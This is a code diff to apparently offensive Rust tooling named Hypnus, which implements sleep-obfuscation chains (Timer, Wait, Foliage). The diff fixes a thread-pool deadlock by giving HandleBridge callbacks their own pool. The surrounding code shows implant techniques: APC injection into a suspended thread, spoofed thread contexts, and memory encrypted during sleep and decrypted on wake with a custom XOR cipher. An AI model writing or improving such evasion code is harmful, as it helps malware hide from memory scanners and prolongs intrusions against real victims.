@@ -672,6 +672,13 @@ struct PoolCleanupGuard {
     event_count: usize,
     pool: *mut c_void,
     h_thread: *mut c_void,
+    /// Dedicated thread pool for `HandleBridge` callbacks in handle-mode.
+    /// Separate from `pool` (which runs the chain timers/waits) so that a
+    /// blocked `ctxs[5]` WFSO on the chain pool's worker doesn't starve
+    /// the TP_WAIT callbacks that signal `internal_event`. Closed AFTER
+    /// the bridge is explicitly dropped (otherwise we'd close a pool with
+    /// live TP_WAITs).
+    bridge_pool: *mut c_void,
 }
 
 impl Drop for PoolCleanupGuard {
@@ -683,6 +690,9 @@ impl Drop for PoolCleanupGuard {
             if !self.pool.is_null() {
                 CloseThreadpool(self.pool);
             }
+            if !self.bridge_pool.is_null() {
+                CloseThreadpool(self.bridge_pool);
+            }
             for i in 0..self.event_count {
                 if !self.events[i].is_null() {
                     NtClose(self.events[i]);
@@ -692,11 +702,16 @@ impl Drop for PoolCleanupGuard {
     }
 }
 
-/// RAII guard for foliage resources (event, helper thread, duplicated thread).
+/// RAII guard for foliage resources (event, helper thread, duplicated thread,
+/// and the dedicated thread pool used by `HandleBridge` for handle-mode waits).
 struct FoliageCleanupGuard {
     event: *mut c_void,
     h_thread: *mut c_void,
     thread: *mut c_void,
+    /// Dedicated thread pool for `HandleBridge` callbacks. Optional: only set
+    /// in handle-mode. Closed AFTER the bridge (which holds the TP_WAITs)
+    /// is dropped, otherwise we'd close a pool with live waits.
+    pool: *mut c_void,
 }
 
 impl Drop for FoliageCleanupGuard {
@@ -710,6 +725,9 @@ impl Drop for FoliageCleanupGuard {
             }
             if !self.thread.is_null() {
                 NtClose(self.thread);
+            }
+            if !self.pool.is_null() {
+                CloseThreadpool(self.pool);
             }
         }
     }
@@ -793,6 +811,7 @@ impl Hypnus {
                 event_count: 3,
                 pool: null_mut(),
                 h_thread: null_mut(),
+                bridge_pool: null_mut(),
             };
 
             // Allocate dedicated threadpool with one worker
@@ -940,7 +959,24 @@ impl Hypnus {
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
                     dbg(b"[T] Handles path hit\n\0");
-                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, &mut env as *mut _)?;
+
+                    // Allocate a dedicated bridge pool so TP_WAIT callbacks
+                    // can fire while the chain pool's only worker is blocked
+                    // in ctxs[5]'s WFSO on internal_event. Without this, the
+                    // bridge callback queues behind the blocked worker and
+                    // never runs — chain deadlocks waiting for itself.
+                    let mut bp = null_mut();
+                    let st = TpAllocPool(&mut bp, null_mut());
+                    if !NT_SUCCESS(st) {
+                        bail!(s!("TpAllocPool (timer bridge) failed"));
+                    }
+                    guard.bridge_pool = bp;
+                    TpSetPoolMinThreads(bp, 1);
+                    TpSetPoolMaxThreads(bp, 4);
+                    let mut bridge_env = TP_CALLBACK_ENVIRON_V3 { Pool: bp, ..Default::default() };
+                    dbg(b"[T] Handles bridge pool allocated\n\0");
+
+                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, &mut bridge_env as *mut _)?;
                     let internal_event = b.internal_event;
                     bridge = Some(b);
 
@@ -1097,6 +1133,7 @@ impl Hypnus {
                 event_count: 4,
                 pool: null_mut(),
                 h_thread: null_mut(),
+                bridge_pool: null_mut(),
             };
 
             // Allocate dedicated threadpool with one worker
@@ -1242,7 +1279,23 @@ impl Hypnus {
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
                     dbg(b"[W] Handles path hit\n\0");
-                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, &mut env as *mut _)?;
+
+                    // Dedicated bridge pool — see Timer's Handles arm for the
+                    // full rationale. Same deadlock pattern: ctxs[5] WFSO on
+                    // internal_event blocks the chain pool's only worker, so
+                    // the bridge's TP_WAIT callback needs its own pool to fire.
+                    let mut bp = null_mut();
+                    let st = TpAllocPool(&mut bp, null_mut());
+                    if !NT_SUCCESS(st) {
+                        bail!(s!("TpAllocPool (wait bridge) failed"));
+                    }
+                    guard.bridge_pool = bp;
+                    TpSetPoolMinThreads(bp, 1);
+                    TpSetPoolMaxThreads(bp, 4);
+                    let mut bridge_env = TP_CALLBACK_ENVIRON_V3 { Pool: bp, ..Default::default() };
+                    dbg(b"[W] Handles bridge pool allocated\n\0");
+
+                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, &mut bridge_env as *mut _)?;
                     let internal_event = b.internal_event;
                     bridge = Some(b);
 
@@ -1388,6 +1441,7 @@ impl Hypnus {
                 event,
                 h_thread: null_mut(),
                 thread: null_mut(),
+                pool: null_mut(),
             };
 
             // Create a new thread in suspended state for APC injection
@@ -1475,11 +1529,24 @@ impl Hypnus {
             ctxs[4].Rcx = thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep/Wait - setup based on WaitPrimitive. Foliage doesn't
-            // allocate its own thread pool (it uses APC injection), so the
-            // bridge falls back to the system default pool via null env.
-            // See HandleBridge docs for the full rationale.
+            // Sleep/Wait - setup based on WaitPrimitive.
+            //
+            // For handle-mode, we allocate a DEDICATED thread pool for the
+            // HandleBridge's TP_WAIT callbacks. Empirically, using the system
+            // default pool (`null_mut()` env) produced wakes that never reached
+            // ctxs[5]'s `WaitForSingleObject(internal_event)` — the chain
+            // would park in `NtSignalAndWaitForSingleObject` forever even after
+            // the user handle signaled. Giving the bridge its own pool makes
+            // Foliage symmetric with Timer/Wait (which both pass an explicit
+            // env) and resolves the hang.
+            //
+            // Pool sizing: min=1 ensures a worker is pre-spawned before the
+            // user handle can possibly fire (no spawn-latency races); max=4
+            // gives headroom for the wakeup_event callback to run in parallel
+            // with the primary_handle callback without queuing.
             let mut bridge: Option<HandleBridge> = None;
+            let mut env: TP_CALLBACK_ENVIRON_V3 = zeroed();
+            let mut env_initialized = false;
             let (bridge_handles, bridge_count) = match self.wait {
                 WaitPrimitive::Timeout { seconds } => {
                     ctxs[5].Rip = self.cfg.wait_for_single.into();
@@ -1490,7 +1557,21 @@ impl Hypnus {
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
                     dbg(b"[F] Handles path hit\n\0");
-                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, null_mut())?;
+
+                    // Allocate the dedicated bridge pool.
+                    let mut pool = null_mut();
+                    let st = TpAllocPool(&mut pool, null_mut());
+                    if !NT_SUCCESS(st) {
+                        bail!(s!("TpAllocPool (foliage bridge) failed"));
+                    }
+                    guard.pool = pool;
+                    TpSetPoolMinThreads(pool, 1);
+                    TpSetPoolMaxThreads(pool, 4);
+                    env = TP_CALLBACK_ENVIRON_V3 { Pool: pool, ..Default::default() };
+                    env_initialized = true;
+                    dbg(b"[F] Handles bridge pool allocated\n\0");
+
+                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, &mut env as *mut _)?;
                     let internal_event = b.internal_event;
                     bridge = Some(b);
 
@@ -1503,6 +1584,7 @@ impl Hypnus {
                     (handles, count)
                 }
             };
+            let _ = env_initialized; // silence unused-warning when only Timeout path runs
 
             // Decrypts the memory after waking up (custom SIMD XOR cipher - self-inverse)
             ctxs[6].Rip = self.cfg.custom_decrypt;
